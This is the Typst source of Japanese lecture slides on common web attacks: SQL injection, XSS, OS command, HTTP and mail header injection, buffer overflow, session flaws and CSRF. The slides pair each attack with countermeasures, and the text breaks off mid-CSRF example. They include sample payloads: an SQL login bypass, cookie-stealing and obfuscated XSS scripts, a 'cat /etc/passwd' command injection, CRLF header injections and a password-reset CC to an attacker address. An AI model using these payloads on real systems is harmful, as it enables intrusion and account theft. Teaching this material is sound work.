#import "style.typ": font-family, pallete, section, theme, url, vulnerability-chart

#show: theme.with(
  title: "ウェブサービスを脅かす攻撃",
  author: "Jonghyeon PARK",
  hero: [
    #let _fgcolor = pallete.silver.I
    #rect(
      width: 100%,
      height: 60%,
      fill: _fgcolor,
      outset: 0%,
      inset: (left: 5em, y: 3em)
    )[
      #align(horizon)[#text(fill: white)[
        #text(size: 40pt, weight: "bold")[
          ウェブサービスを脅かす攻撃
        ]\

        #text(size: 22pt, weight: "medium")[
          \~一般的に広く報告されている事例を中心に\~
        ]
      ]]
    ]
    #align(center + horizon)[#text(fill: _fgcolor, size: 22pt, weight: "medium")[
      Jonghyeon PARK\
      
      #text(size: .7em)[
        2026-01\
        佐賀大学 理工学部 特別聴講学生\
        #link("mailto:25931028@edu.cc.sage-u.ac.jp")[25931028\@edu.cc.saga-u.ac.jp]\; #link("mailto:jonghyeon@jnu.ac.kr")[jonghyeon\@jnu.ac.kr]
      ]
      \
      \
    ]]
  ]
)

#pagebreak()
#pagebreak()

#section(
  title: "任意コードおよびロジック実行",
  hero: [
    #align(center + horizon)[
      #stack(
        dir: ltr,
        spacing: 1em,
        rect(fill: pallete.silver.V, inset: 1em, radius: .5em)[#text(fill: white)[*User Input*\ (Data)]],
        align(horizon)[$arrow.r$ Interpreted $arrow.r$],
        rect(fill: pallete.ruby.I, inset: 1em, radius: .5em)[#text(fill: white)[*Execution*\ (Code)]],
      )
      #v(1em)
      #text(size: 1.3em, weight: "bold")[Arbitrary Code Execution (ACE)]
      \
      入力値が検証なしに\
      システムのコマンドやロジックとして実行される
    ]
  ]
)[
  - 最も致命的な攻撃タイプ

  - あらゆる形態の攻撃へと発展させる可能性がある

  #pagebreak()

  - インジェクション攻撃
  
    - インジェクション攻撃は、値(value)が実行ロジックとして動作可能なすべての状況で発生し得る
  
    - 値が絶対に実行可能にならないようにする必要がある
    
    - あるいは、値が実行コードを予測不可能な形で分岐させないようにする必要がある

  #pagebreak()

  - 任意コード実行脆弱性 (Arbitrary Code Execution, ACE vulnerability)\

    \ 
    値が実行可能である\
    $=$ 外部から望むコードを任意に実行できる\
    $=$ 悪意のあるコードを実行できる

  \

  - インジェクション攻撃は、任意コード実行脆弱性を実現する一般的な方法の一つ
]

#section(
  title: "任意コードおよびロジック実行/SQLインジェクション",
  hero: [
    #vulnerability-chart((
      ([致命度], [極めて高い], 100%),
      ([攻撃難易度], [低い], 30%),
      ([影響範囲], [極めて大きい], 100%),
      ([対策難易度], [極めて低い], 20%),
    ))
  ]
)[
  - クライアントの入力値を操作し、サーバーのデータベースを攻撃

  - ユーザーが入力したデータをSQL構文として認識させることで実現

  \

  - SQLクエリを文字列#super[string]として生成して使用することで発生

  #pagebreak()

  - 影響

    - データベース上の非公開データの非認可閲覧
    
    - データベースの改ざん、削除、ダンプ

    - 認証回避による不正ログイン

    - プロシージャを利用したOSコマンドの実行

  #pagebreak()

  - 攻撃ベクトル

    - 攻撃対象:\
      #text(size: .8em)[このコマンドは、IDとパスワードがDBの`user_table`上のデータと一致する場合のみ`user`データを取得する]
      ```sql
      SELECT user FROM user_table WHERE id='user-id' AND password='user-password';
      ```
    - `id`と`password`フィールドに以下の値を入力:
      #text(size: .8em)[#table(
        columns: (1fr, 2fr, 1fr, 2fr),
        inset: (y: .5em),
        [#text(size: .8em)[ID]], `admin`, [#text(size: .8em)[パスワード]], `' or '1' = '1`
      )]

  #pagebreak()

  - 攻撃ベクトル
  
    - ```sql
      SELECT user FROM user_table WHERE id='user-id' AND password='user-password';
      ```
    - #text(size: .8em)[#table(
        columns: 2,
        inset: (y: .5em),
        [#text(size: .8em)[ID]], `admin`,
        [#text(size: .8em)[パスワード]], `' or '1' = '1`
      )]
    - 結果
      ```sql
      SELECT user FROM user_table WHERE id='admin' AND password=' ' OR '1' = '1';
      ```

  #pagebreak()
  
  - 攻撃ベクトル
    - 結果
      ```sql
      SELECT user FROM user_table WHERE 
      ```

      ```sql
      id='admin' AND password=' '  -- false
      ```

      ```sql
      OR
      ```

      ```sql
      '1' = '1' -- true
      ```
    
    - `admin`アカウントに関する情報を返し、クエリが終了

    - パスワードを知らなくても、正しいパスワードを入力したかのように動作

  #pagebreak()

  - 対策
    - SQLパラメータバインドの使用
      - SQLクエリ文とデータを分離するAPI
      - 例: Python + SQLite
        ```python
        query = "INSERT INTO users (name, age) VALUES (?, ?)"
        cursor.execute(query, (name, age))
        ```
      - 例: PHP
        ```php
        $stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
        $stmt->execute([$username, $password]);
        ```
  #pagebreak()
  
  - 対策
  
    - 入力値の検証およびフィルタリング
    
      - サーバー側で許可されたパターンの入力のみを受け付けるか、特殊文字を除去

    - ORMの使用

      - クエリ文で直接DBを制御せず、ORM(Object-Relational Mapping)を通じてDBを制御

      - クエリ文の直接的なチューニングができないため、性能低下の可能性がある

  #pagebreak()
  
  - 事例
    #text(size: .8em)[
      - 米国のセキュリティ研究者が、不法駐車の罰金を避けるために車両ナンバープレートを「Null」として登録 @wired-null-license-plate \
        #figure(
          image("static/sql-injection-null-license-plate.webp", width: 30%),
          caption: [「NULL」自動車ナンバープレート @droogi-null-license-plate],
        )
        - 数ヶ月後、\$12,000の罰金請求書を受け取る
        - 車両番号が欠落した罰金請求書がすべて「Null」ナンバープレートに課された
      ]
  #pagebreak()

  - 事例

    - 米国セブン-イレブンへのSQLインジェクション攻撃 @wired-heartland-sentencing
      - 1億3千万件のクレジットカード番号が流出
      - 攻撃者はその後、懲役20年の判決を受ける @us-court-new-jersy-criminal-09-626

    - ゲーム『Fortnite』でSQLインジェクション脆弱性が発見される @thehackernews-fortnite-account-hacked
      #text(size: .8em)[
        - XSS攻撃、OAuthアカウント奪取などと組み合わせてアカウントの乗っ取りが可能
        - プレイヤーの個人情報へのアクセス、ゲーム内通貨の購入、アイテム購入後の現金化が可能
        - 大規模な被害が発生する前に脆弱性を修正
      ]
]

#section(
  title: "任意コードおよびロジック実行/\nXSS 攻撃",
  hero: [
    #vulnerability-chart((
      ([致命度], [高い], 75%),
      ([攻撃難易度], [極めて低い], 20%),
      ([影響範囲], [大きい], 65%),
      ([対策難易度], [普通], 40%),
    ))
  ],
  header: "任意コードおよびロジック実行/XSS 攻撃"
)[
  - XSS(Cross-site Scripting)

  - 攻撃者がサイトに悪意のあるスクリプトを挿入する攻撃

  - サイトにアクセスしたユーザーは、挿入されたコードを実行することになる
  
  \
  
  - SQLインジェクションと共に、ウェブ上で最も基本的な脆弱性攻撃手法とされる

  #pagebreak()

  - 目的
    - トローリング(trolling): 単にユーザーに不便を強いる
  #grid(
    columns: (1fr, 1fr),
    inset: (x: .5em),
    [
      #figure(
        image("static/xss-trolling-large-div.png", width: 90%),
        caption: [(再現) Namuwiki XSS攻撃事件当時のサイト内討論スレッド: 巨大なdiv要素が画面を覆う @alphawiki-namuwiki-xss-attack@theseed-namuwiki-xss-attack]
      )
    ],
    [
      #figure(
        image("static/xss-trolling-restaurance.jpg", width: 90%),
        caption: [
          2017年前後に韓国で流行した通称「レストランス」トローリング@namuwiki-high-quality-restaurant \
          ウェブサイト内のすべての要素を回転させ、最終的にゲーム『ヒーローズ・オブ・ザ・ストーム』のロゴ、「時空の嵐」の中へすべての要素が吸い込まれるように演出
        ]
      )
    ]
  )

  #pagebreak()
  
  - 目的
  
    - クッキー、トークンなどの機密情報の奪取

    - ローカルに保存されたアクセスキーなどを獲得し、ユーザーアカウントにアクセス

  \

  - 攻撃対象

    ```typescript
    let e: HTMLElement; let fe: HTMLTextAreaElement;
    // feの値をフィルタリングせずにそのままHTMLコードとして使用
    e.innerHTML = fe.value;
    ```

  #pagebreak()

  - 攻撃ベクトル

    - スクリプトタグの挿入
      ```html
      <script>$('textarea').val(document.cookie);$('form.new-thread-form').submit();</script>
      ```

    - JavaScriptリンクの挿入
      ```html
      <a href="javascript:alert('XSS')">XSS</a>
      ```
      
    - イベント属性の挿入
      ```html
      <img src="#" onerror="alert('XSS')">
      ```
  #pagebreak()

  - 攻撃ベクトル

    - ブラックリスト回避: あまり使用されないタグや属性の使用
      ```html
      <ruby oncopy="alert('XSS')">XSS</ruby>
      ```

    - 内容の難読化 #text(size: .7em)[HTMLエンコード: #url("https://mothereff.in/html-entities")]
      ```html
      <a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#xA;&#x63;
      &#x72;&#x69;&#x70;&#x74;&#xA;&#x3A;&#xA;&#x61;&#x6C;
      &#x65;&#x72;&#x74;&#xA;&#x28;&#x27;&#x58;&#x53;&#x53;
      &#x27;&#x29;">XSS</a>
      ```

  #pagebreak()
  
  - 攻撃ベクトル
  
    - スクリプトの難読化 #text(size: .7em)[#url("https://utf-8.jp/public/aaencode.html")]
    
  #text(size: .5em)[```
  ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ ['_']; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) ['c']+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟΘﾟﾉ+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ) [ﾟΘﾟ]+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) ['c']+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ) .ﾟｰﾟﾉ+ (ﾟДﾟ) .ﾟｰﾟﾉ+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) ['c']+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ) ['c']+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟΘﾟﾉ+ ((ﾟｰﾟ) + (ﾟｰﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ) ['c']+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) ['c']+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟΘﾟﾉ+ (o^_^o)+ (ﾟДﾟ) .ﾟｰﾟﾉ+ ((ﾟｰﾟ) + (ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟΘﾟﾉ+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ) ['c']+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟΘﾟﾉ+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ) .ﾟДﾟﾉ+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
  ```]

  #pagebreak()

  - 対策
  
    - 入力フィルタ: 文字列フィルタまたは文字列フィルタが実装されたAPIを使用
    
      - XSSに脆弱なAPIには、代替APIが既に存在している
      
      - `element.innerHTML`\
        $->$ `element.textContent`, DOMDocument APIを使用

      - 多くの状況でHTMLタグインジェクションをフィルタリングするための自動フィルタリング:\
        `<` $->$ `&lt;` /  `>` $->$ `&gt;`

  #pagebreak()

  - 対策

    - 出力フィルタ
    
      - HTML5から`iframe`タグにsandboxオプションが設定可能

      - 標準が実装されていない旧バージョンのブラウザでは動作しないため、補助的に使用

    - コンテンツセキュリティポリシー (CSP; Content Security Policy) の使用
]

#section(
  title: "任意コードおよびロジック実行/\nOSコマンドインジェクション",
  hero: [
    #vulnerability-chart((
      ([致命度], [極めて高い], 100%),
      ([攻撃難易度], [高い], 70%),
      ([影響範囲], [極めて大きい], 100%),
      ([対策難易度], [容易], 20%),
    ))
  ],
  header: "任意コードおよびロジック実行/OSコマンドインジェクション",
)[
  - ユーザー入力がサーバーのOSコマンドとして実行される

  - 影響
    - コマンドを実行する主体の権限に応じて被害が発生
    - サーバー内ファイルの操作 : 重要情報の漏洩、設定ファイルの改ざん・削除など
    - 不当なシステム操作 : システム終了、管理者アカウントの追加など
    - 任意コード実行 : バックドアの設置、ウイルス・ボット感染などの悪意ある動作の遂行
    - 攻撃の踏み台として利用 : 他のシステムへの攻撃(DoS)、スパムメールの送信など
    
  #pagebreak()

  - 攻撃ベクトル

    - 外部プログラムを呼び出し可能な関数、危険な関数などを使用するサーバーへの攻撃

    - 例: Perl
      - `open()`, `system()`, `eval()`

    - 例: PHP
      - `exec()`, `passthru()`, `shell_exec()`, `system()`

  #pagebreak()

  - 攻撃対象
  #text(size: .8em)[```perl
  #!/usr/bin/perl
  use strict; use warnings; use CGI;
  
  my $cgi = CGI->new;
  print $cgi->header;
  
  # ユーザーからIPアドレスを入力として受け取る
  my $ip = $cgi->param('ip');
  
  # 脆弱性発生地点: ユーザー入力をそのままシステムコマンドに連結している
  # 攻撃者が入力値として "127.0.0.1; cat /etc/passwd" を入れると両方のコマンドが実行される
  my $output = `ping -c 1 $ip`;
  
  print "<pre>$output</pre>";
  ```]

  #pagebreak()

  - 対策
  
    - シェルを呼び出さない代替APIの使用
      - 例: Perl\
        ```perl
        use Fcntl;
        # open($fh, "<", $filename);
        sysopen($fh, $filename, O_RDONLY);
        ```
        
    - OSコマンドを直接呼び出すコードの除去: \
    
      同一の機能を持つ標準ライブラリを使用する
  
  #pagebreak()

  - 事例

    - IPAに届け出られた事例

      - ASUS無線LANルーター `JVNDB-2015-000011` @jvndb-2015-000011
        - 管理コンソールでの入力値処理の不備により発生
        - ログイン可能なユーザーが任意のOSコマンドを実行可能

      - Usermin `JVNDB-2014-000057` @jvndb-2014-000057
        - ウェブメール管理ツールで発生
        - ログインしたユーザーが特定の操作時に任意コマンドを実行可能
]

#section(
  title: "任意コードおよびロジック実行/HTTPヘッダーインジェクション",
  hero: [
    #vulnerability-chart((
      ([致命度], [普通], 50%),
      ([攻撃難易度], [普通], 60%),
      ([影響範囲], [普通], 50%),
      ([対策難易度], [容易], 20%),
    ))
  ]
)[
  - HTTPリクエストに悪意のある文字列を挿入し、\
    HTTPレスポンスを操作 
  
  - ユーザーが提供したパラメータをサニタイズせずに\
    使用する場合に脆弱

  #pagebreak()

  - 攻撃ベクトル

    - HTTPレスポンス分割: CRLFを用いた悪性文字列の挿入
    
    - GETパラメータをそのままセッション管理に活用する場合、レスポンスを汚染させる可能性がある@f5-http-header-injection
      #text(size: .8em)[#grid(
        columns: (1fr, 1fr),
        inset: .5em,
        [
          - `http://abc.me?status=1`
        ],
        [
          - `http://abc.me?status=1 \r\n\r\n<html>(html code)</html>`
        ],
        [
          ```
          HTTP/1.1 200 OK
          ...
          Set-Cookie:status=1
          ```
        ],
        [
          ```
          HTTP/1.1 200 OK
          ...
          Set-Cookie:status=1

          <html>(html code)</html>
          ```
        ]
      )]
      
  #pagebreak()

  - 攻撃対象
    - 例: Perl
      #text(size: .8em)[```perl
      $cgi = new CGI;
      $num = $cgi->param('num');
      # ユーザーが num=1 を入力した場合 -> Location: http://example.jp/index.cgi?num=1
      print "Location: http://example.jp/index.cgi?num=$num\n\n";
      ```]
      
    - 入力値 `3%0D%0ASet-Cookie:SID=evil` による攻撃
      #text(size: .8em)[```
      HTTP/1.x 302 Found
      Location: http://example.jp/index.cgi?num=3
      Set-Cookie: SID=evil
      ...
      ```
      ]

  - 攻撃ベクトル
  
    - #text(size: .8em)[```
        HTTP/1.x 302 Found
        Location: http://example.jp/index.cgi?num=3
        Set-Cookie: SID=evil
        ...
        ```
        ]
        
    - サーバーの意図に反して、攻撃者が `Set-Cookie` ヘッダーを強制的に挿入

  #pagebreak()

  - 対策

    - ヘッダー出力用専用APIの使用
    
      - 言語の標準ライブラリ、フレームワークが提供するヘッダー設定関数を使用
      
      - ほとんどの最新APIは、ヘッダー値に改行文字が含まれるとエラーを発生させるか、自動的に除去する

  #pagebreak()
  - 対策
    - 改行文字(CRLF)の除去
      - APIを使用できない場合、入力値から `\r`, `\n` を必ず削除または置換する
      - 例: Perl
        ```perl
        $str =~ s/\r|\n//g;
        ```

    - 入力をヘッダーに直接使用しないよう設計を変更
]


#section(
  title: "任意コードおよびロジック実行/メールヘッダーインジェクション",
  hero: [
    #vulnerability-chart((
      ([致命度], [高い], 60%),
      ([攻撃難易度], [普通], 50%),
      ([影響範囲], [普通], 60%),
      ([対策難易度], [容易], 30%),
    ))
  ]
)[
  - アプリケーションが電子メールを処理する際、ユーザー入力値に対する検証が不十分なために発生する脆弱性

  - 攻撃者がCRLF(改行文字; `%0d%0a`)を挿入してメールヘッダーを操作したり、本文を改ざんしたりする


  #pagebreak()

  - 影響
  
    - スパムおよびフィッシング:\
      公式アカウントを詐称して悪質なリンクや偽情報を送信 (`Subject`, `From` の改ざん)
      
    - 重要情報の奪取 (Account Takeover)\
      パスワードリセットリンクや2FAコードが含まれるメールを攻撃者にCC(`Cc`, `Bcc`)で送り、アカウントを奪取
      
    - リモートコード実行 (RCE)\
      メール送信ライブラリ(PHP `mail()` など)がOSコマンドを呼び出す際、パラメータ注入を通じてサーバーを掌握可能


  #pagebreak()

   - 攻撃ベクトル
   
    - ヘッダーインジェクションによる情報奪取 @hahwul-email-injection

      - シナリオ: パスワード再設定機能
        - 正常なリクエスト: `email=victim@domain.com`
        
        - 攻撃リクエスト:
          ```http
          POST /reset-password HTTP/1.1
          email=victim@domain.com%0ACc:attacker@domain.com
          ```
  #pagebreak()
  
  - 攻撃ベクトル
  
    - ヘッダーインジェクションによる情報奪取 @hahwul-email-injection
      ```http
      POST /reset-password HTTP/1.1
      email=victim@domain.com%0ACc:attacker@domain.com
      ```
          
      - メールサーバーは改行文字を認識し、 `Cc` ヘッダーを追加
      
      - 被害者に届くはずのパスワードリセットリンクが攻撃者のメール(`attacker@domain.com`)にも送信される
      - 攻撃者はリンクをクリックして被害者のアカウントを奪取

  #pagebreak()
  
  - 攻撃ベクトル
  
    - リモート任意コード実行 @hahwul-email-injection
      - PHP `mail()` 関数とMTA(Sendmail, Eximなど)の連携過程で発生し得る
      
      - 5番目のパラメータ(`$additional_parameters`)にシェルメタ文字やMTAオプションを注入

  #pagebreak()

  - 対策

    - ユーザーからデータを受け取ってメールを送信する際
      - 指定されたフォーマットのデータ以外は処理しないように制限
      - 改行文字は多様な攻撃対象として活用されるため、必須的に処理する
    - ヘッダーと本文の分離
      - ユーザー入力値は、極力メールヘッダー(`To`, `From`, `Subject`)に直接使用せず、本文にのみ含まれるように設計
      
  #pagebreak()

  - 対策
  
    - 専用ライブラリの使用
    
      - `mail()` 関数やOSコマンドを直接呼び出さず、セキュリティが検証されたライブラリ(PHPMailer, SwiftMailerなど)を使用
      
      - 最新バージョンのライブラリを維持し、既知のRCE脆弱性(CVE-2016-10033など)を防御
]

#section(
  title: "任意コードおよびロジック実行/バッファオーバフロー",
  hero: [
    #vulnerability-chart((
      ([致命度], [極めて高い], 100%),
      ([攻撃難易度], [極めて高い], 90%),
      ([影響範囲], [極めて大きい], 100%),
      ([対策難易度], [高い#footnote[
        依存している技術スタックで発生し、ソフトウェアアップデートで解決可能な場合、対策難易度は低い。脆弱性の原因が外部になく、直接コードベースを修正しなければならない場合を指す。
      ]], 80%),
    ))
  ]
)[
  - プログラムが確保したメモリ領域を超えてデータを書き込んだり読み取ったりする @cwe-119

  #figure(
    image("static/cwe-119-diagram.png", width: 50%),
    caption: [バッファオーバフローの概念図 (source: CWE @cwe-119)]
  )

  - 主にC, C++, アセンブラなど、メモリを直接管理する言語で書かれたプログラムで発生

  #pagebreak()
  
  - 影響
  
    - サービス拒否 (DoS): プログラムの異常終了

    - 権限外のデータへのアクセス
    
    - 任意コード実行: リターンアドレス(Return Address)などを上書きし、悪意のあるコードを実行 (Shellcode Injection)
    
  #pagebreak()

  - 実現

    - 現代のウェブスタック(PHP, Java, Python, Ruby, Goなど)は言語レベルでメモリを管理するため、バッファオーバフローが発生する可能性は低い @cwe-119

    \

    - インフラや依存関係に問題が生じて脆弱性となる場合がある
      - 言語のコンパイラ/インタプリタ/VM
      - ウェブアプリが使用するライブラリ
      - CGIなどで呼び出されるレガシーなバイナリプログラム

  #pagebreak()

  - 事例
  
  #grid(
    columns: (2fr, 1.4fr),
    inset: (x: .3em),
    [
      - ハートブリード(Heartbleed) @heartbleed-com
        - OpenSSLの「ハートビート」パケットのデータサイズを実際と異なる形で送信
        
        - サーバーはメモリに保存された他の情報まで引き出し、操作されたデータサイズ分だけパケットを満たして返す
    ],
    [
      #figure(
        image("static/xkcd-heartbleed-explanation.png"),
        caption: [xkcd, ハートブリードバグの原理 @xkcd-13354]
      )
    ]
  )
    
  #pagebreak()

  - 事例

  #grid(
    columns: (2fr, 1.4fr),
    inset: (x: .3em),
    [
    - モンゴブリード(MongoBleed) 
    
      - ハートブリードと同様の問題が MongoDB で発生 @akamai-mongobleed-cve-2025-14847 @codingapple-mongobleed-rainbowsix
      
      - 2025年12月に発生したゲーム『レインボーシックス シージ』のハッキング事件がこの脆弱性を利用したものと推定される@rocketboys-rainbow-six-siege-outage
    ],
    [
      #figure(
        image("static/mongobleed-rainbowsix-siege.png"),
        caption: [
          レインボーシックス シージのハッキング事件では、攻撃者が全ユーザーにそれぞれ20億円相当の有料通貨を不正に付与した\
          VarsityGamingの映像キャプチャ @youtube-varsitygaming-siege-has-been-hacked
        ]
      )
    ]
  )
]
#section(
  title: "セッション管理, ブラウザセキュリティ/セッション管理の不備",
  hero: [
    #vulnerability-chart((
      ([致命度], [極めて高い], 90%),
      ([攻撃難易度], [普通], 50%),
      ([影響範囲], [極めて大きい], 90%),
      ([対策難易度], [普通#footnote[個別の対策の難易度は低いが、安全な乱数生成、クッキー属性(HttpOnly, Secure)の設定などチェック項目が多く、ロジック設計段階でも考慮が必要である。]], 40%),
    ))
  ]
)[
  - サーバーはユーザーを識別するためにセッション(Session)を使用する

  - セッション管理が不十分な場合、攻撃者が他人のセッションIDを奪取または推測してアカウントを乗っ取ることができる

  #pagebreak()

  - 主な脆弱性タイプ
  
    - セッション識別子の推測: セッション識別子が規則的なパターンを持っていたり、短い長さで生成されている場合
    
    - セッションタイムアウトの未設定: ログアウト後もセッションがサーバーに残っていたり、有効期限が無制限の場合
    
    - セッション固定: 攻撃者が発行させたセッションIDを被害者に使用させるよう誘導する

  #pagebreak()

  - 対策

    - セッションIDの生成
      - 安全な乱数生成器を使用し、十分な長さを確保する
      - ログインのたびに新しいセッションIDを発行する (セッション固定の防止)

    - タイムアウトの設定
      - 適切な有効期限を設定し、ログアウト時にサーバー側でセッションを破棄する
      
  #pagebreak()

  - 対策
    - セッション属性の設定 (Cookie)
      - クッキーに `HttpOnly` 属性を追加する
      - HTTPS通信でのみクッキーを送信する (スニッピング防御)
      - クロスサイトリクエスト時のクッキー送信を制限する (CSRF防御の補助)

]

#section(
  title: "セッション管理, ブラウザセキュリティ",
  hero: [
    #align(center + horizon)[
      #rect(fill: pallete.silver.I, inset: 1em, radius: .5em)[
        #text(fill: white, size: 1.5em, weight: "bold")[HTTP: Stateless Protocol]
      ]
      #text(size: 2em)[#sym.arrow.b]
      \
      
      #text(size: 1.2em)[
        状態を維持するための技術 (Cookie & Session)\
        +\
        クライアント(ブラウザ)のセキュリティモデル
      ]
    ]
  ]
)[
  - HTTPプロトコルはステートレス(Stateless)である
  
    - サーバーはクライアントの以前のリクエストを記憶できない
    
    - ログイン状態の維持、ショッピングカート機能などのために別途のメカニズムが必要
    
      $->$ セッションとクッキー

  #pagebreak()

  - ウェブの信頼モデル
    - サーバーはクライアント(ブラウザ)が送る識別子(セッションID)を信頼する
    - ブラウザはサーバーが送るスクリプトを信頼して実行する

  - この信頼関係を悪用した攻撃
    - セッションハイジャック: ユーザーの身分証(セッションID)を盗んでなりすます
    - CSRF: ブラウザの自動クッキー送信機能を悪用し、ユーザーの意図に関わらないリクエストを送る
    - クリックジャッキング: ブラウザの画面を操作してユーザーを騙す
]

#section(
  title: "セッション管理, ブラウザセキュリティ/CSRF",
  hero: [
    #vulnerability-chart((
      ([致命度], [高い], 60%),
      ([攻撃難易度], [普通], 50%),
      ([影響範囲], [大きい], 60%),
      ([対策難易度], [容易], 30%),
    ))
  ]
)[
  - CSRF (Cross-Site Request Forgery, サイト間リクエスト偽造) @mdn-csrf @cf-cross-site-request-forgery

  \
  
  - ユーザーが自身の意図とは無関係に、攻撃者が意図した行為(修正、削除、登録など)を特定のウェブサイトにリクエストさせる攻撃

  - ユーザーがウェブサイトにログインした状態(セッションクッキーを保持)であることを悪用する

  #pagebreak()

  - 目的

    - アカウントのなりすまし
    
    - 管理者アカウントでの強制的な投稿、パスワード変更、退会処理
    
    - ルーターの設定変更、オンラインショップでの決済など

  #pagebreak()

  - 攻撃ベクトル

    - 攻撃対象: bank.com での送金業務時のURLが以下のようになっている場合
      ```
      https://bank.com/transfer?to=another_user&amount=1000
      ``` 
      
    - 被害者のローカルデバイスに有効なログインセッションが存在する
    
    - 攻撃者が被害者に攻撃用コンテンツを送信する

  #pagebreak()

  - 攻撃ベクトル
  
    #text(size: .8em)[
      - 被害者がクリックすると、ブラウザは bank.com にリクエストを送る
      ```html
      <html><body><form method="POST"
        action="https://bank.com/transfer?to=attacker&amount=1000000">
